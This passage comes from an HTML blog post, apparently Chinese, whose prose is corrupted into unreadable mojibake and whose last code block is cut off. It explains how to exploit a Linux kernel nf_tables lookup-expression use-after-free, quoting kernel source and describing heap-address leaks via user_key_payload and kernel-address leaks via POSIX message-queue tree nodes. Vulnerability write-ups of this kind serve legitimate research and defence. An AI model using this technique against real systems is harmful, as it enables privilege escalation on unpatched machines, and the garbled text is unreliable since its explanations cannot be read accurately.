class="keyword">if</span> (list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; nft_set_is_anonymous(<span class="built_in">set</span>))</span><br><span class="line">nft_set_destroy(ctx, <span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_lookup_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line"></span><br><span class="line">nf_tables_destroy_set(ctx, priv-&gt;<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_expr_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">   struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">type</span> =</span> expr-&gt;ops-&gt;type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expr-&gt;ops-&gt;destroy)</span><br><span class="line">expr-&gt;ops-&gt;destroy(ctx, expr);</span><br><span class="line">module_put(type-&gt;owner);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nft_expr_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">nf_tables_expr_destroy(ctx, expr);</span><br><span class="line">kfree(expr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¿™é‡Œçš„è°ƒç”¨å…³ç³»å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®æœ€ç»ˆå®ç°çš„å°±åªæ˜¯å•å•<code>kfree</code>äº†ä¸ª<code>expr</code>ï¼Œè€Œå¹¶æ²¡æœ‰è„±é“¾ä¹‹ç±»çš„æ“ä½œï¼Œé‚£ä¹ˆæ­¤æ—¶å°±å‘ç”Ÿäº†<code>UAF</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> <span class="title">nft_lookup_ops</span> =</span> &#123;</span><br><span class="line">.type= &amp;nft_lookup_type,</span><br><span class="line">.size= NFT_EXPR_SIZE(<span class="keyword">sizeof</span>(struct nft_lookup)),</span><br><span class="line">.eval= nft_lookup_eval,</span><br><span class="line">.init= nft_lookup_init,</span><br><span class="line">.activate= nft_lookup_activate,</span><br><span class="line">.deactivate= nft_lookup_deactivate,</span><br><span class="line">.destroy= nft_lookup_destroy,</span><br><span class="line">.dump= nft_lookup_dump,</span><br><span class="line">.validate= nft_lookup_validate,</span><br><span class="line">.reduce= nft_lookup_reduce,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> <span class="title">nft_lookup_type</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;lookup&quot;</span>,</span><br><span class="line">.ops= &amp;nft_lookup_ops,</span><br><span class="line">.policy= nft_lookup_policy,</span><br><span class="line">.maxattr= NFTA_LOOKUP_MAX,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç„¶è€Œ<code>lookup</code>çš„<code>expre</code>çš„<code>flag</code>ä½æ°å¥½æ²¡æœ‰<code>NFT_EXPR_STATEFUL</code>æ ‡è¯†ä½ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="æ³„æ¼å †åœ°å€"><a href="#æ³„æ¼å †åœ°å€" class="headerlink" title="æ³„æ¼å †åœ°å€"></a>æ³„æ¼å †åœ°å€</h3><p>å…¶å®ä¸Šè¿°æ¼æ´å­˜åœ¨å¾ˆå¤§çš„å±€é™æ€§ï¼Œåœ¨è§¦å‘åˆ°<code>UAF</code>ä¹‹åï¼Œå”¯ä¸€èƒ½åšåˆ°çš„ä¸€ä»¶äº‹å°±æ˜¯ä¿®æ”¹<code>(struct nft_lookup *)(expr-&gt;data)-&gt;binding-&gt;next</code>æŒ‡é’ˆæŒ‡å‘æ–°ç”Ÿæˆçš„<code>new_expr</code>ã€‚</p><p><code>expr = kzalloc(expr_info.ops-&gt;size, GFP_KERNEL);</code>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« æåˆ°äº†å†…æ ¸å†…å­˜éš”ç¦»è¿™ä¸€è¯´ï¼Œå› ä¸ºæ ‡è¯†ä½çš„ä¸åŒå¯¼è‡´æ— æ³•ä½¿ç”¨å¾ˆå¤šå·²æœ‰ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU destructor */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>datalen;<span class="comment">/* length of this data */</span></span><br><span class="line"><span class="keyword">char</span>data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢<code>next</code>æŒ‡é’ˆçš„åç§»æ­£å¥½ä¸º<code>0x18</code>è€Œè¿™é‡Œçš„<code>data</code>æ•°ç»„æ˜¯ç”¨æˆ·å¯æ§ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è§¦å‘uafä¹‹åæ³„æ¼å‡ºå †åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user_preparse</span><span class="params">(struct key_preparsed_payload *prep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">upayload</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> datalen = prep-&gt;datalen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (datalen &lt;= <span class="number">0</span> || datalen &gt; <span class="number">32767</span> || !prep-&gt;data)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">upayload = kmalloc(<span class="keyword">sizeof</span>(*upayload) + datalen, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!upayload)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* attach the data */</span></span><br><span class="line">prep-&gt;quotalen = datalen;</span><br><span class="line">prep-&gt;payload.data[<span class="number">0</span>] = upayload;</span><br><span class="line">upayload-&gt;datalen = datalen;</span><br><span class="line"><span class="built_in">memcpy</span>(upayload-&gt;data, prep-&gt;data, datalen);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(user_preparse);</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”å¯ä»¥æ³¨æ„åˆ°ä»–çš„ç”³è¯·å‚æ•°ä¹Ÿä¸º<code>GFP_KERNEL</code>ã€‚</p><h3 id="æ³„æ¼å†…æ ¸åœ°å€"><a href="#æ³„æ¼å†…æ ¸åœ°å€" class="headerlink" title="æ³„æ¼å†…æ ¸åœ°å€"></a>æ³„æ¼å†…æ ¸åœ°å€</h3><p>è¿™é‡Œç”¨åˆ°çš„æ˜¯mqueueä¸­çš„posixæ¶ˆæ¯é˜Ÿåˆ—æ¨¡å—ï¼Œè¯¥æ¨¡å—å’Œmsg_msgä¸€æ ·æ˜¯IPCè¿›ç¨‹é—´é€šä¿¡çš„æ¶ˆæ¯é˜Ÿåˆ—åŠŸèƒ½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>  __rb_parent_color;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">rb_right</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">rb_left</span>;</span></span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span><span class="title">rb_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">msg_list</span>;</span></span><br><span class="line"><span class="keyword">int</span>priority;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>posix_msg_tree_node</code>çš„nextæŒ‡é’ˆåˆšå¥½è½åœ¨äº†0x18è¿™ä¸ªä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_mq_timedsend</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">const</span> <span class="keyword">char</span> __user *u_msg_ptr,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> msg_prio,</span></span></span><br><span class="line"><span class="params"><span class="function">struct timespec64 *ts)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext_wait_queue</span> <span class="title">wait</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext_wait_queue</span> *<span class="title">receiver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg_ptr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mqueue_inode_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">ktime_t</span> expires, *timeout = <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">new_leaf</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  msg_ptr = load_msg(u_msg_ptr, msg_len);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache)</span><br><span class="line">new_leaf = kmalloc(<span class="keyword">sizeof</span>(*new_leaf), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">  spin_lock(&amp;info-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache &amp;&amp; new_leaf) &#123;</span><br><span class="line"><span class="comment">/* Save our speculative allocation into the cache */</span></span><br><span class="line">INIT_LIST_HEAD(&amp;new_leaf-&gt;msg_list);</span><br><span class="line">info-&gt;node_cache = new_leaf;</span><br><span class="line">new_leaf = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kfree(new_leaf);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">if</span> (info-&gt;attr.mq_curmsgs == info-&gt;attr.mq_maxmsg) &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">    <span class="keyword">if</span> (receiver) &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    ret = msg_insert(msg_ptr, info);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE5(mq_timedsend, <span class="keyword">mqd_t</span>, mqdes, <span class="keyword">const</span> <span class="keyword">char</span> __user *, u_msg_ptr,</span><br><span class="line"><span class="keyword">size_t</span>, msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span>, msg_prio,</span><br><span class="line"><span class="keyword">const</span> struct __kernel_timespec __user *, u_abs_timeout)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec64</span> <span class="title">ts</span>, *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (u_abs_timeout) &#123;</span><br><span class="line"><span class="keyword">int</span> res = prepare_timeout(u_abs_timeout, &amp;ts);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">p = &amp;ts;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> do_mq_timedsend(mqdes, u_msg_ptr, msg_len, msg_prio, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´ä½“æµç¨‹å°±æ˜¯é¦–å…ˆä»ç”¨æˆ·æ€è½½å…¥æ¶ˆæ¯ï¼Œç„¶ååˆ›å»ºå¯¹åº”çš„<code>posix_msg_tree_node</code>ç»“æ„ä½“ï¼Œå°†ç»“æ„ä½“æ”¾å…¥åˆ°<code>info</code>ä¸­ï¼Œæœ€åæ’å…¥åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚å¯ä»¥çœ‹åˆ°åœ¨ç”³è¯·<code>posix_msg_tree_node</code>ç»“æ„ä½“æ—¶ä¹Ÿæ˜¯ä½¿ç”¨äº†<code>GFP_KERNEL</code>æ ‡è¯†ä½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">msg_insert</span><span class="params">(struct msg_msg *msg, struct mqueue_inode_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> **<span class="title">p</span>, *<span class="title">parent</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">leaf</span>;</span></span><br><span class="line"><span class="keyword">bool</span> rightmost = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">p = &amp;info-&gt;msg_tree.rb_node;</span><br><span class="line"><span class="keyword">while</span> (*p) &#123;</span><br><span class="line">parent = *p;</span><br><span class="line">leaf = rb_entry(parent, struct posix_msg_tree_node, rb_node);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(leaf-&gt;priority == msg-&gt;m_type))</span><br><span class="line"><span class="keyword">goto</span> insert_msg;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg-&gt;m_type &lt; leaf-&gt;priority) &#123;</span><br><span class="line">p = &amp;(*p)-&gt;rb_left;</span><br><span class="line">rightmost = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">p = &amp;(*p)-&gt;rb_right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;node_cache) &#123;</span><br><span class="line">leaf = info-&gt;node_cache;</span><br><span class="line">info-&gt;node_cache = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">leaf = kmalloc(<span class="keyword">sizeof</span>(*leaf), GFP_ATOMIC);</span><br><span class="line"><span class="keyword">if</span> (!leaf)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">INIT_LIST_HEAD(&amp;leaf-&gt;msg_list);</span><br><span class="line">&#125;</span><br><span class="line">leaf-&gt;priority = msg-&gt;m_type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rightmost)</span><br><span class="line">info-&gt;msg_tree_rightmost = &amp;leaf-&gt;rb_node;</span><br><span class="line"></span><br><span class="line">rb_link_node(&amp;leaf-&gt;rb_node, parent, p);</span><br><span class="line">rb_insert_color(&amp;leaf-&gt;rb_node, &amp;info-&gt;msg_tree);</span><br><span class="line">insert_msg:</span><br><span class="line">info-&gt;attr.mq_curmsgs++;</span><br><span class="line">info-&gt;qsize += msg-&gt;m_ts;</span><br><span class="line">list_add_tail(&amp;msg-&gt;m_list, &amp;leaf-&gt;msg_list);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨æœ€åæ˜¯å°†æ¶ˆæ¯æ·»åŠ åˆ°<code>leaf</code>ä¸­å»äº†ï¼Œå¹¶ä¸”nextæŒ‡é’ˆä¸º0x18ï¼Œå¦‚æœå‡ºå‘äº†uafè¦†ç›–çš„è¯å°±ä¼šè¾¾æˆä»¥ä¸‹æ•ˆæœ</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/8-1675211986.png"                      alt="å·å›¾ä¾µåˆ "                ></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥åªéœ€è¦è¯»å–æ¶ˆæ¯å³å¯è¾¾åˆ°æ³„æ¼çš„ç›®çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(mq_timedreceive, <span class="keyword">mqd_t</span>, mqdes, <span class="keyword">char</span> __user *, u_msg_ptr,</span><br><span class="line"><span class="keyword">size_t</span>, msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> __user *, u_msg_prio,</span><br><span class="line"><span class="keyword">const</span> struct __kernel_timespec __user *, u_abs_timeout)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec64</span> <span class="title">ts</span>, *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (u_abs_timeout) &#123;</span><br><span class="line"><span class="keyword">int</span> res = prepare_timeout(u_abs_timeout, &amp;ts);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">p = &amp;ts;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> do_mq_timedreceive(mqdes, u_msg_ptr, msg_len, u_msg_prio, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_mq_timedreceive</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">char</span> __user *u_msg_ptr,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> __user *u_msg_prio,</span></span></span><br><span class="line"><span class="params"><span class="function">struct timespec64 *ts)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg_ptr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mqueue_inode_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext_wait_queue</span> <span class="title">wait</span>;</span></span><br><span class="line"><span class="keyword">ktime_t</span> expires, *timeout = <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">new_leaf</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ts) &#123;</span><br><span class="line">expires = timespec64_to_ktime(*ts);</span><br><span class="line">timeout = &amp;expires;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">audit_mq_sendrecv(mqdes, msg_len, <span class="number">0</span>, ts);</span><br><span class="line"></span><br><span class="line">f = fdget(mqdes);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!f.file)) &#123;</span><br><span class="line">ret = -EBADF;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inode = file_inode(f.file);</span><br><span class="line"><span class="keyword">if</span> (unlikely(f.file-&gt;f_op != &amp;mqueue_file_operations)) &#123;</span><br><span class="line">ret = -EBADF;</span><br><span class="line"><span class="keyword">goto</span> out_fput;</span><br><span class="line">&#125;</span><br><span class="line">info = MQUEUE_I(inode);</span><br><span class="line">audit_file(f.file);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!(f.file-&gt;f_mode &amp; FMODE_READ))) &#123;</span><br><span class="line">ret = -EBADF;</span><br><span class="line"><span class="keyword">goto</span> out_fput;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* checks if buffer is big enough */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(msg_len &lt; info-&gt;attr.mq_msgsize)) &#123;</span><br><span class="line">ret = -EMSGSIZE;</span><br><span class="line"><span class="keyword">goto</span> out_fput;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * msg_insert really wants us to have a valid, spare node struct so</span></span><br><span class="line"><span class="comment"> * it doesn&#x27;t have to kmalloc a GFP_ATOMIC allocation, but it will</span></span><br><span class="line"><span class="comment"> * fall back to that if necessary.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache)</span><br><span class="line">new_leaf = kmalloc(<span class="keyword">sizeof</span>(*new_leaf), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;info-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache &amp;&amp; new_leaf) &#123;</span><br><span class="line"><span class="comment">/* Save our speculative allocation into the cache */</span></span><br><span class="line">INIT_LIST_HEAD(&amp;new_leaf-&gt;msg_list);</span><br><span class="line">info-&gt;node_cache = new_leaf;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span 